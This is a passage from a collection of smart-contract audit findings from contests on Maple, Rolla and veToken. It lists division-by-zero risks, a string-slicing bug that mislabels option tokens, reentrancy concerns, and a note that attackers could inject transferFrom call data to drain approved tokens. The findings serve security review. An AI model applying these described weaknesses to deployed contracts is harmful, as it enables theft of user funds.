MapleLoanInternals.sol._getRefinanceCommitment refinancer_\n        MapleLoanInternals.sol._removeCollateral destination_\n        RevenueDistributionToken.sol.balanceOfAssets account_\n        \n\n\nTitle: Div by 0\nSeverity: Low/Medium Risk\n\n\nDivision by 0 can lead to accidentally revert,\n(An example of a similar issue - https://github.com/code-423n4/2021-10-defiprotocol-findings/issues/84)\n\n        MapleLoanInternals.sol (L351) extraDelegateFee_ might be 0)\n        MapleLoanInternals.sol (L637) one_ might be 0)\n        MapleLoanInternals.sol (L460) principalRequested_ might be 0)\n        RevenueDistributionToken.sol (L285) numerator_ might be 0)\n        MapleLoanInternals.sol (L631) one_ might be 0)\n        RevenueDistributionToken.sol (L87) vestingPeriod_ might be 0)\n        MapleLoanInternals.sol (L488) periodicRate might be 0)\n        MapleLoanInternals.sol (L486) totalPayments_ might be 0)\n        MapleLoanInternals.sol (L354) extraTreasuryFee_ might be 0)\n        MapleLoanInternals.sol (L488) endingPrincipal_ might be 0)\n\n\n\nTitle: Override function but with different argument location\nSeverity: Low/Med Risk\n\n\n    \n    \n        xMPL.sol.constructor inherent ERC20.sol.constructor but the parameters does not match\n        RevenueDistributionToken.sol.constructor inherent ERC20.sol.constructor but the parameters does not match\n\n\n\n\nTitle: Open TODOs\nSeverity: Low Risk\n\nOpen TODOs can hint at programming or architectural errors that still need to be fixed. \nThese files has open TODOs:\n\nOpen TODO in RevenueDistributionToken.sol line 275 :         // TODO: investigate whether leave this `require()` in for clarity from error message, or let the safe math check in `callerAllowance - shares_` handle the underflow.\n\nOpen TODO in RevenueDistributionToken.sol line 77 :     // TODO: Revisit returns\n\n\n\nTitle: Anyone can withdraw others\nSeverity: Low Risk\n\n\nAnyone can withdraw users shares. Although we think that they are sent to the right address, it is still\n    1) not the desired behavior\n    2) can be dangerous if the receiver is a smart contract\n    3) the receiver may not know someone withdraw him\n    \n\n        RevenueDistributionToken.maxWithdraw\n        RevenueDistributionToken.withdraw\n        RevenueDistributionToken.previewWithdraw\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/3"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L] `ConfigTimelockController` One address should not be able to be a `proposer` and a `executor` at the same time\n\nThe purpose of the design which have two separate roles of `proposers` and `executors` is to prevent the centralization risk which one can propose a change and get it executed right away by themselves.\n\nHowever, the current implementation allows the same address to be in `proposers` and `executors` at the same time, this makes such a design becomes a unenforced law.\n\nIn operation practise, the admin can and, we believe they have a natural tendency to add both roles to the same address as this is easier in operation.\n\n### Recommendation\n\nConsider adding a check to make sure `proposers` and `executors` do not include any same address\n\n## [L] Tokens with fee on transfer are not supported\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `Controller.sol#_mintOptionsPosition()`, `Controller.sol#_mintSpread()` and `Controller.sol#_claimCollateral()` assumes that the received amount is the same as the transfer amount, and uses it for collateralToken minting and redeeming.\n\n### Recommendation\n\nMaking sure no FOT tokens will be whitelisted in the protocol.",
    "dataSource": {
      "name": "code-423n4/2022-03-rolla-findings",
      "repo": "https://github.com/code-423n4/2022-03-rolla-findings",
      "url": "https://github.com/code-423n4/2022-03-rolla-findings/issues/42"
    }
  },
  {
    "title": "Incorrect strike price displayed in name/symbol of qToken ",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L38\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L90\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L136\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L206\n\n\n# Vulnerability details\n\n## Impact\n\n`_slice()` in `options/QTokenStringUtils.sol` cut a string into `string[start:end]` However, while fetching bytes, it uses `bytes(_s)[_start+1]` instead of `bytes(_s)[_start+i]`. This causes the return string to be composed of `_s[start]*(_end-_start)`. The result of this function is then used to represent the decimal part of strike price in name/symbol of qToken, leading to potential confusion over the actual value of options.\n\n\n## Proof of Concept\n\nERC20 tokens are usually identified by their name and symbol. If the symbols are incorrect, confusions may occur. Some may argue that even if names and symbols are not accurate, it is still possible to identify correct information/usage of tokens by querying the provided view functions and looking at its interactions with other contracts. However, the truth is many users of those tokens are not very tech savvy, and it is reasonable to believe a large proportion of users are not equipped with enough knowledge, or not willing to dig further than the plain symbols and names. This highlights the importance of maintaining a correct facade for ERC20 tokens.\n\nThe bug demonstrated here shows that any qToken with decimals in its strike price will be misdisplayed, and the maximal difference between actual price and displayed one can be up to 0.1 BUSD.\n\nThe exploit can be outlined through the following steps:\n\n* Alice created a call option with strike price 10000.90001. The expected symbol should for this qToken should be : `ROLLA WETH 31-December-2022 10000.90001 Call`\n\n* Both `_qTokenName()` and `_qTokenSymbol()` in `options/QTokenStringUtils.sol` use `_displayedStrikePrice()` to get the strike price string which should be `10000.90001`\n\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L38\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L90\n\n```\n    function _qTokenName(\n        address _quantConfig,\n        address _underlyingAsset,\n        address _strikeAsset,\n        uint256 _strikePrice,\n        uint256 _expiryTime,\n        bool _isCall\n    ) internal view virtual returns (string memory tokenName) {\n        string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);\n        string memory displayStrikePrice = _displayedStrikePrice(\n            _strikePrice,\n            _strikeAsset\n        );\n\t\t\n        ...\n\t\t\n        tokenName = string(\n            abi.encodePacked(\n                \"ROLLA\",\n                \" \",\n                underlying,\n                \" \",\n                _uintToChars(day),\n                \"-\",\n                monthFull,\n                \"-\",\n                Strings.toString(year),\n                \" \",\n                displayStrikePrice,\n                \" \",\n                typeFull\n            )\n        );\n    }\n```\n\n```\n\n    function _qTokenSymbol(\n        address _quantConfig,\n        address _underlyingAsset,\n        address _strikeAsset,\n        uint256 _strikePrice,\n        uint256 _expiryTime,\n        bool _isCall\n    ) internal view virtual returns (string memory tokenSymbol) {\n        string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);\n        string memory displayStrikePrice = _displayedStrikePrice(\n            _strikePrice,\n            _strikeAsset\n        );\n\n        // convert the expiry to a readable string\n        (uint256 year, uint256 month, uint256 day) = DateTime.timestampToDate(\n            _expiryTime\n        );\n\n        // get option type string\n        (string memory typeSymbol, ) = _getOptionType(_isCall);\n\n        // get option month string\n        (string memory monthSymbol, ) = _getMonth(month);\n\n        /// concatenated symbol string\n        tokenSymbol = string(\n            abi.encodePacked(\n                \"ROLLA\",\n                \"-\",\n                underlying,\n                \"-\",\n                _uintToChars(day),\n                monthSymbol,\n                _uintToChars(year),\n                \"-\",\n                displayStrikePrice,\n                \"-\",\n                typeSymbol\n            )\n        );\n    }\n```\n\n* `_displayedStrikePrice()` combines the quotient and the remainder to form the strike price string. The remainder use `_slice` to compute. In this case, the quotient is `10000` and the remainder is `90001`\n\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L136\n```\nfunction _displayedStrikePrice(uint256 _strikePrice, address _strikeAsset)\n        internal\n        view\n        virtual\n        returns (string memory)\n    {\n        uint256 strikePriceDigits = ERC20(_strikeAsset).decimals();\n        uint256 strikePriceScale = 10**strikePriceDigits;\n        uint256 remainder = _strikePrice % strikePriceScale;\n        uint256 quotient = _strikePrice / strikePriceScale;\n        string memory quotientStr = Strings.toString(quotient);\n\n        if (remainder == 0) {\n            return quotientStr;\n        }\n\n        uint256 trailingZeroes;\n        while (remainder % 10 == 0) {\n            remainder /= 10;\n            trailingZeroes++;\n        }\n\n        // pad the number with \"1 + starting zeroes\"\n        remainder += 10**(strikePriceDigits - trailingZeroes);\n\n        string memory tmp = Strings.toString(remainder);\n        tmp = _slice(tmp, 1, (1 + strikePriceDigits) - trailingZeroes);\n\n        return string(abi.encodePacked(quotientStr, \".\", tmp));\n    }\n```\n\n* However inside the loop of `_slice()`, `slice[i] = bytes(_s)[_start + 1];` lead to an incorrect string, which is `90001`\n\nhttps://github.com/RollaProject/quant-protocol/blob/main/contracts/options/QTokenStringUtils.sol#L206\n\n```\n    function _slice(\n        string memory _s,\n        uint256 _start,\n        uint256 _end\n    ) internal pure virtual returns (string memory) {\n        uint256 range = _end - _start;\n        bytes memory slice = new bytes(range);\n        for (uint256 i = 0; i < range; ) {\n            slice[i] = bytes(_s)[_start + 1];\n            unchecked {\n                ++i;\n            }\n        }\n\n        return string(slice);\n    }\n```\n\n* The final qtoken name now becomes `ROLLA WETH 31-December-2022 10000.99999 Call`, which results in confusion over the actual value of options.\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nFix the bug in the `_slice()`\n\n```\n    function _slice(\n        string memory _s,\n        uint256 _start,\n        uint256 _end\n    ) internal pure virtual returns (string memory) {\n        uint256 range = _end - _start;\n        bytes memory slice = new bytes(range);\n        for (uint256 i = 0; i < range; ) {\n            slice[i] = bytes(_s)[_start + i];\n            unchecked {\n                ++i;\n            }\n        }\n\n        return string(slice);\n    }\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-rolla-findings",
      "repo": "https://github.com/code-423n4/2022-03-rolla-findings",
      "url": "https://github.com/code-423n4/2022-03-rolla-findings/issues/28"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/RollaProject/quant-protocol/blob/98639a3ba9c6a50607c304dc6e0c2ee223dbc747/contracts/Controller.sol#L557\n\n\n# Vulnerability details\n\n## Impact\nApproved tokens to OperateProxy can be withdrawn by attacker by malicious manipulation of data\n\n## Proof of Concept\nIn `Controller.sol`, attacker can inject malicious functioncall data as args in `operate()` which will ultimately call `_call()`.  For example, if the receiver is one of the ERC20 token which has approved OperateProxy contract, attacker can inject `transferFrom()` as data and token address as callee which results in withdrawing the funds. \n\n## Tools Used\nmanual analysis \n\n## Recommended Mitigation Steps\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-rolla-findings",
      "repo": "https://github.com/code-423n4/2022-03-rolla-findings",
      "url": "https://github.com/code-423n4/2022-03-rolla-findings/issues/23"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* uint is always >= 0, can't be negative:\n```solidity\n  function setFees(uint256 _lockIncentive)\n    ...\n    if (_lockIncentive >= 0 && _lockIncentive <= 30)\n```\n\n* No need for safe math where overflow/underflow is impossible, e.g.:\n```solidity\n  if (_balance < _amount) {\n  _amount = _withdrawSome(_gauge, _amount.sub(_balance));\n```\n\n* When you declared the named return value, then you do not need to return afterward explicitly:\n```solidity\n  function withdraw(IERC20 _asset) external returns (uint256 balance) {\n   ...\n   return balance;\n```\n\n* No need to initialize to default values, e.g.:\n```solidity\n  uint256 public periodFinish = 0;\n  uint256 public rewardRate = 0;\n  uint256 public queuedRewards = 0;\n  uint256 public currentRewards = 0;\n  uint256 public historicalRewards = 0;\n```\n\n* Repeated storage access should be cached, e.g. veAsset is accessed 3 times here:\n```solidity\n        uint256 veAssetBalance = IERC20(veAsset).balanceOf(address(this));\n        if (veAssetBalance > 0) {\n            IERC20(veAsset).safeTransfer(staker, veAssetBalance);\n        }\n        //increase ammount\n        uint256 veAssetBalanceStaker = IERC20(veAsset).balanceOf(staker);\n ```",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/271"
    }
  },
  {
    "title": "QA Report",
    "body": "* No need to use SafeMath with Solidity version >0.8:\n```solidity\n  pragma solidity 0.8.7;\n  using SafeMath for uint256;\n```\nNow it basically performs safe math operations twice, thus wasting gas.\n\n* contract VoterProxy does not explicitly implement IStaker interface. It causes some confusion, e.g. the declaration of interface and implementation contracts differ:\n```solidity\n  function createLock(uint256, uint256) external;\n  function createLock(uint256 _value, uint256 _unlockTime) external returns (bool)\n```\nThe interface does not declare the return value, while the implementation returns a boolean indicating success. Better always explicitly implement an interface to force compile-time enforcements.\n\n* setOwner could be a 2-step (propose-accept) process to avoid accidental errors.\n\n* In VoterProxy when an operator deposits a new token, it is added to the list of protectedTokens. \nThis token is never set back to false again. Consider setting protectedTokens to false in operator withdrawal functions (withdraw, withdrawAll) when the balance after becomes 0.\nThen tokens might be reclaimed if the operator has withdrawn all of them, and later someone accidentally sends them directly to the contract or something like that.\n\n* You can make event parameters 'indexed' to allow for filtering, e.g. hash in VoteSet:\n```solidity\n  event VoteSet(bytes32 hash, bool valid);\n```\n\n* function voteGaugeWeight could validate that the lengths of ```_tokenVote``` and ```_weight``` are equal.\n\n* You can use built-in time keywords, e.g. here:\n```solidity\n  uint256 private constant WEEK = 7 * 86400;\n  uint256 private constant WEEK = 7 weeks;\n``` \n\n* safeApprove is deprecated, see: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L39-L44\n\n*   The protocol does not support fee on transfer and other weird tokens, e.g.:\n```solidity\n  IERC20(_rewardToken).safeTransferFrom(msg.sender, address(this), _amount);\n  rewardTokenInfo[_rewardToken].queuedRewards += _amount;\n```\nor\n```solidity\n  //add supply\n  _totalSupply = _totalSupply.add(_amount);\n  //add to _for's balance sheet\n  _balances[_for] = _balances[_for].add(_amount);\n  //take tokens from sender\n  stakingToken.safeTransferFrom(msg.sender, address(this), _amount);\n```\nMake sure that your users are informed about that, or consider validating the balance before/after to know the real amount transferred.\n\n* totalWeight might be 0, because updateveAssetWeight does not enforce minimum total weight, thus it is possible that rewardClaimed function will revert in runtime here making the users not being able to get their rewards:\n```solidity\n    //calc the amount of veAssetEarned\n    uint256 _veAssetEarned = _amount.mul(veTokenMinter.veAssetWeights(address(this))).div(\n        veTokenMinter.totalWeight()\n    );\n```\n\n* Functions are not protected from re-entrancy. Some of them do not follow the Check-Effects-Interactions pattern, thus can be exploited if the call target contains the transfer hook. For example, here it first transfers the token and only then updates the supply:\n```solidity\n  veToken.safeTransfer(_to, _amount);\n  totalSupply += _amount;\n```\nThere are many more functions that do the external interactions and are not protected. Consider adding ReentrancyGuard to all the main user interacting functions.",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/268"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents**\n\n- [[L-01] Unsafe casting may overflow](#l-01-unsafe-casting-may-overflow)\n- [[L-02] Check Effects Interactions pattern not respected](#l-02-check-effects-interactions-pattern-not-respected)\n- [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function)\n- [[L-04] Missing address(0) checks](#l-04-missing-address0-checks)\n- [[L-05] Unbounded loop on array can lead to DoS](#l-05-unbounded-loop-on-array-can-lead-to-dos)\n- [[L-06] Lack of event emission](#l-06-lack-of-event-emission)\n- [[L-07] Add a timelock to critical functions](#l-07-add-a-timelock-to-critical-functions)\n- [[N-01] Missing friendly revert strings](#n-01-missing-friendly-revert-strings)\n- [[N-02] Unused named returns](#n-02-unused-named-returns)\n\n## [L-01] Unsafe casting may overflow\n\nSafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting.\nConsider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:\n\n```solidity\ncontracts/VE3DLocker.sol:\n  122          uint256 currentEpoch = block.timestamp.div(rewardsDuration).mul(rewardsDuration);\n  123:         epochs.push(Epoch({supply: 0, date: uint32(currentEpoch)}));\n\n  157  \n  158:         rewardData[_rewardsToken].lastUpdateTime = uint40(block.timestamp);\n  159:         rewardData[_rewardsToken].periodFinish = uint40(block.timestamp);\n\n  500:                 epochs.push(Epoch({supply: 0, date: uint32(nextEpochDate)}));\n\n  547:                 LockedBalance({amount: lockAmount, unlockTime: uint32(unlockTime)})\n\n  585:                 userL.unlockTime = uint32(unlockTime);\n\n  596:         e.supply = e.supply.add(uint224(lockAmount));\n```\n\n## [L-02] Check Effects Interactions pattern not respected\n\nTo avoid unexpected behavior in the future (be it for the solution or for a fork), it's recommended to always follow the CEI pattern.\n\nConsider always moving the state-changes before the external calls.\n\nAffected code:\n\n```solidity\ncontracts/BaseRewardPool.sol:\n  294      function donate(uint256 _amount) external {\n  295          IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), _amount);\n  296:         queuedRewards = queuedRewards.add(_amount); //@audit : CEIP not respected. Move this line before the transfer\n  297          emit Donated(queuedRewards);\n  298      }\n\ncontracts/VE3DRewardPool.sol:\n  336      function donate(address _rewardToken, uint256 _amount) external {\n  337          IERC20(_rewardToken).safeTransferFrom(msg.sender, address(this), _amount);\n  338:         rewardTokenInfo[_rewardToken].queuedRewards += _amount;  //@audit : CEIP not respected. Move this line before the transfer\n  339      }\n\ncontracts/VirtualBalanceRewardPool.sol:\n  161      function donate(uint256 _amount) external {\n  162          IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), _amount);\n  163:         queuedRewards = queuedRewards.add(_amount); //@audit : CEIP not respected. Move this line before the transfer\n  164      }\n```\n\n## [L-03] Deprecated safeApprove() function\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:\n\n```solidity\ncontracts/Booster.sol:\n  374:             IERC20(token).safeApprove(rewardContract, _amount); //@audit medium-risk: should do like everywhere in the solution and approve 0 first\n\ncontracts/VE3DLocker.sol:\n  211:                 IERC20(rewardData[_rewardsToken].ve3Token).safeApprove(\n  215:                 IERC20(rewardData[_rewardsToken].ve3Token).safeApprove(\n  221:                 IERC20(_rewardsToken).safeApprove(rewardData[_rewardsToken].veAssetDeposits, 0);\n  222:                 IERC20(_rewardsToken).safeApprove(\n\ncontracts/VE3DRewardPool.sol:\n  287:                 IERC20(_rewardToken).safeApprove(rewardTokenInfo[_rewardToken].veAssetDeposits, 0);\n  288:                 IERC20(_rewardToken).safeApprove(\n  301:                     IERC20(rewardTokenInfo[_rewardToken].ve3Token).safeApprove(\n  305:                     IERC20(rewardTokenInfo[_rewardToken].ve3Token).safeApprove(\n\ncontracts/VeAssetDepositor.sol:\n  162:             IERC20(minter).safeApprove(_stakeAddress, _amount);\n\ncontracts/VoterProxy.sol:\n  101:             IERC20(_token).safeApprove(_gauge, 0);\n  102:             IERC20(_token).safeApprove(_gauge, balance);\n  152:         IERC20(veAsset).safeApprove(escrow, 0);\n  153:         IERC20(veAsset).safeApprove(escrow, _value);\n  160:         IERC20(veAsset).safeApprove(escrow, 0);\n  161:         IERC20(veAsset).safeApprove(escrow, _value);\n```\n\n## [L-04] Missing address(0) checks\n\nAffected code (from Slither):\n\n```solidity\n    - operator = _operator (token/VE3Token.sol#23)\n    - operator = op_ (VirtualBalanceRewardPool.sol#97)\n    - staker = _staker (VeAssetDepositor.sol#45)\n    - minter = _minter (VeAssetDepositor.sol#46)\n    - veAsset = _veAsset (VeAssetDepositor.sol#47)\n    - escrow = _escrow (VeAssetDepositor.sol#48)\n    - feeManager = _feeManager (VeAssetDepositor.sol#55)\n    - rewardManager = rewardManager_ (VE3DRewardPool.sol#99)\n    - staker = _staker (Booster.sol#111)\n    - minter = _minter (Booster.sol#116)\n    - veAsset = _veAsset (Booster.sol#117)\n    - feeDistro = _feeDistro (Booster.sol#118)\n    - owner = _owner (Booster.sol#125)\n    - feeManager = _feeM (Booster.sol#131)\n    - poolManager = _poolM (Booster.sol#137)\n    - rewardFactory = _rfactory (Booster.sol#152)\n    - tokenFactory = _tfactory (Booster.sol#153)\n    - stashFactory = _sfactory (Booster.sol#159)\n    - rewardArbitrator = _arb (Booster.sol#164)\n    - voteDelegate = _voteDelegate (Booster.sol#170)\n    - lockRewards = _rewards (Booster.sol#184)\n    - stakerRewards = _stakerRewards (Booster.sol#185)\n    - stakerLockRewards = _stakerLockRewards (Booster.sol#186)\n    - treasury = _treasury (Booster.sol#245)\n    - dao = _dao (helper/SmartWalletWhitelist.sol#33)\n    - future_checker = _checker (helper/SmartWalletWhitelist.sol#40)\n    - veAsset = _veAsset (ExtraRewardStashV3.sol#49)\n    - operator = _operator (ExtraRewardStashV3.sol#50)\n    - staker = _staker (ExtraRewardStashV3.sol#51)\n    - gauge = _gauge (ExtraRewardStashV3.sol#52)\n    - rewardFactory = _rFactory (ExtraRewardStashV3.sol#53)\n    - veAsset = _veAsset (ExtraRewardStashV2.sol#49)\n    - operator = _operator (ExtraRewardStashV2.sol#50)\n    - staker = _staker (ExtraRewardStashV2.sol#51)\n    - gauge = _gauge (ExtraRewardStashV2.sol#52)\n    - rewardFactory = _rFactory (ExtraRewardStashV2.sol#53)\n    - operator = _operator (token/VeToken.sol#20)\n    - operator = _operator (ExtraRewardStashV1.sol#46)\n    - staker = _staker (ExtraRewardStashV1.sol#47)\n    - gauge = _gauge (ExtraRewardStashV1.sol#48)\n    - rewardFactory = _rFactory (ExtraRewardStashV1.sol#49)\n    - veAsset = _veAsset (VoterProxy.sol#50)\n    - escrow = _escrow (VoterProxy.sol#51)\n    - gaugeProxy = _gaugeProxy (VoterProxy.sol#52)\n    - minter = _minter (VoterProxy.sol#54)\n    - owner = _owner (VoterProxy.sol#64)\n    - operator = _operator (VoterProxy.sol#74)\n    - depositor = _depositor (VoterProxy.sol#80)\n    - (success,result) = _to.call{value: _value}(_data) (VoterProxy.sol#281)\n    - rewardFactory = _rewardFactory (StashFactory.sol#27)\n    - operator = operator_ (BaseRewardPool.sol#105)\n    - rewardManager = rewardManager_ (BaseRewardPool.sol#106)\n    - operator = _operator (DepositToken.sol#23)\n```\n\n## [L-05] Unbounded loop on array can lead to DoS\n\nAs these arrays can grow quite large (only `push` operations, no `pop`), the transaction's gas cost could exceed the block gas limit and make it impossible to call the impacted functions at all.\n\n```solidity\ncontracts/BaseRewardPool.sol:\n  126:         extraRewards.push(_reward);\n  176:         for (uint256 i = 0; i < extraRewards.length; i++) {\n  199:         for (uint256 i = 0; i < extraRewards.length; i++) {\n  218:         for (uint256 i = 0; i < extraRewards.length; i++) {\n  245:         for (uint256 i = 0; i < extraRewards.length; i++) {\n  282:             for (uint256 i = 0; i < extraRewards.length; i++) {\n\ncontracts/Booster.sol:\n  282:         poolInfo.push(\n  329:         for (uint256 i = 0; i < poolInfo.length; i++) {\n\ncontracts/RewardFactory.sol:\n  49:         for (uint256 i = 0; i < length; i++) {\n  52:         activeList.push(pid);\n  66:         for (uint256 i = 0; i < length; i++) {\n  71:                 activeList.pop();\n\ncontracts/VE3DLocker.sol:\n  123:         epochs.push(Epoch({supply: 0, date: uint32(currentEpoch)}));\n  156:         rewardTokens.push(_rewardsToken);\n  207:         for (uint256 i; i < rewardTokens.length; i++) {\n  286:         for (uint256 i = 0; i < userRewards.length; i++) {\n  457:         for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\n  500:                 epochs.push(Epoch({supply: 0, date: uint32(nextEpochDate)}));\n  546:             userLocks[_account].push(\n  579:                 userLocks[_account].push(\n  640:             for (uint256 i = nextUnlockIndex; i < length; i++) {\n  720:         for (uint256 i; i < rewardTokens.length; i++) {\n  803:             for (uint256 i = 0; i < rewardTokens.length; i++) {\n\ncontracts/VE3DRewardPool.sol:\n  138:         extraRewards.push(_reward);\n  148:         for (uint256 i = 0; i < rewardTokens.length(); i++) {\n  214:         for (uint256 i = 0; i < length; i++) {\n  238:         for (uint256 i = 0; i < length; i++) {\n  257:         for (uint256 i = 0; i < length; i++) {\n  281:         for (uint256 i = 0; i < rewardTokens.length(); i++) {\n  326:             for (uint256 i = 0; i < length; i++) {\n```\n\nConsider introducing a reasonable upper limit based on block gas limits and adding a method to remove elements in the array.\n\n## [L-06] Lack of event emission\n\nAccording to Slither, these should emit events (indeed, state variables are being updated):\n\n```solidity\nVirtualBalanceRewardPool.queueNewRewards(uint256) (VirtualBalanceRewardPool.sol#166-188) should emit an event for: \n - queuedRewards = 0 (VirtualBalanceRewardPool.sol#173) \n - queuedRewards = 0 (VirtualBalanceRewardPool.sol#184) \n - queuedRewards = _rewards (VirtualBalanceRewardPool.sol#186) \nBooster.setFeeInfo(uint256,uint256) (Booster.sol#193-217) should emit an event for: \n - lockFeesIncentive = _lockFeesIncentive (Booster.sol#196) \n - stakerLockFeesIncentive = _stakerLockFeesIncentive (Booster.sol#197) \nVE3DLocker.setKickIncentive(uint256,uint256) (VE3DLocker.sol#185-190) should emit an event for: \n - kickRewardPerEpoch = _rate (VE3DLocker.sol#188) \nBaseRewardPool.queueNewRewards(uint256) (BaseRewardPool.sol#300-325) should emit an event for: \n - queuedRewards = 0 (BaseRewardPool.sol#307) \n - queuedRewards = 0 (BaseRewardPool.sol#320) \n - queuedRewards = _rewards (BaseRewardPool.sol#322) \n```\n\n## [L-07] Add a timelock to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).  \n\nConsider adding a timelock to:\n\n```solidity\ncontracts/Booster.sol:\n  219:     function setFees(\n\ncontracts/VeAssetDepositor.sol:\n  59:     function setFees(uint256 _lockIncentive) external {\n```\n\n## [N-01] Missing friendly revert strings\n\nHere, a friendly message should exist for users to understand what went wrong:\n\n```solidity\ncontracts/VE3DLocker.sol:\n  154:         require(rewardData[_rewardsToken].lastUpdateTime == 0);\n  155:         require(_rewardsToken != address(stakingToken));\n  165:             require(_ve3Token != address(0));\n  166:             require(_ve3TokenStaking != address(0));\n  167:             require(_veAssetDeposits != address(0));\n  180:         require(rewardData[_rewardsToken].lastUpdateTime > 0);\n```\n\n## [N-02] Unused named returns\n\nWhile not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:\n\n```solidity\ncontracts/VE3DLocker.sol:\n  282:         returns (EarnedData[] memory userRewards)\n  295:     function lockedBalanceOf(address _user) external view returns (uint256 amount) {\n  300:     function balanceOf(address _user) external view returns (uint256 amount) {\n  305:     function balanceAtEpochOf(uint256 _epoch, address _user) public view returns (uint256 amount) {\n  332:     function pendingLockOf(address _user) external view returns (uint256 amount) {\n  376:     function totalSupply() external view returns (uint256 supply) {\n  399:     function totalSupplyAtEpoch(uint256 _epoch) external view returns (uint256 supply) {\n  418:     function findEpochId(uint256 _time) public view returns (uint256 epoch) {\n\ncontracts/VoterProxy.sol:\n  109:     function withdraw(IERC20 _asset) external returns (uint256 balance) {\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/264"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n### [L-01] Missing checks for `address(0)` when assigning values to address state variables.\n#### Impact\nSetters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever.\n#### Proof of Concept\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L38-L51\n\n```solidity\nconstructor(\n        address _staker,\n        address _minter,\n        address _veAsset,\n        address _escrow,\n        uint256 _maxTime\n    ) {\n        staker = _staker;\n        minter = _minter;\n        veAsset = _veAsset;\n        escrow = _escrow;\n        feeManager = msg.sender;\n        maxTime = _maxTime;\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L52-L57\n\n```solidity\n\n    function setFeeManager(address _feeManager) external {\n        require(msg.sender == feeManager, \"!auth\");\n        feeManager = _feeManager;\n        emit FeeManagerUpdated(_feeManager);\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L104-L119\n\n```solidity\nconstructor(\n        address _staker,\n        address _minter,\n        address _veAsset,\n        address _feeDistro\n    ) {\n        isShutdown = false;\n        staker = _staker;\n        owner = msg.sender;\n        voteDelegate = msg.sender;\n        feeManager = msg.sender;\n        poolManager = msg.sender;\n        minter = _minter;\n        veAsset = _veAsset;\n        feeDistro = _feeDistro;\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L123-L139\n\n```solidity\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n        emit OwnerUpdated(_owner);\n    }\n\n    function setFeeManager(address _feeM) external {\n        require(msg.sender == feeManager, \"!auth\");\n        feeManager = _feeM;\n        emit FeeManagerUpdated(_feeM);\n    }\n\n    function setPoolManager(address _poolM) external {\n        require(msg.sender == poolManager, \"!auth\");\n        poolManager = _poolM;\n        emit PoolManagerUpdated(_poolM);\n    }\n```\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L168-L172\n\n```solidity\n    function setVoteDelegate(address _voteDelegate) external {\n        require(msg.sender == voteDelegate, \"!auth\");\n        voteDelegate = _voteDelegate;\n        emit VoteDelegateUpdated(_voteDelegate);\n    